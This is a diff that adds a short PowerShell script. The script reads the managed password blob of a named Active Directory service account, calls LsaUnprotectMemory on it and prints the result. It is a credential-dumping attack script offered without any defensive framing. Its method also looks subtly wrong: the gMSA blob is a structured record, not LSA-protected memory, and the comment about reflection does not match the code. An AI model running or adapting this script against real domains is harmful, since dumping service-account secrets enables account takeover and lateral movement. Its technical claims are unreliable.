@@ -1,0 +1,31 @@
+Import-Module ActiveDirectory
+
+# Pull the raw blob
+$gmsa = Get-ADServiceAccount -Identity "DDOGRW_SVC" -Properties 'msDS-ManagedPassword'
+$blob = $gmsa.'msDS-ManagedPassword'
+
+# Load required .NET type from memory (needed on older builds)
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class M
+{
+  [DllImport("secur32.dll", SetLastError = false)]
+  public static extern int LsaUnprotectMemory(IntPtr buffer, int size);
+}
+"@
+
+# Extract and decrypt blob using reflection
+function ConvertFrom-GmsaBlob {
+    param ($blob)
+    $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($blob.Length)
+    [System.Runtime.InteropServices.Marshal]::Copy($blob, 0, $ptr, $blob.Length)
+    [M]::LsaUnprotectMemory($ptr, $blob.Length)
+    $bytes = New-Object byte[] $blob.Length
+    [System.Runtime.InteropServices.Marshal]::Copy($ptr, $bytes, 0, $blob.Length)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
+    return $bytes
+}
+
+$raw = ConvertFrom-GmsaBlob $blob
+[System.Text.Encoding]::Unicode.GetString($raw)
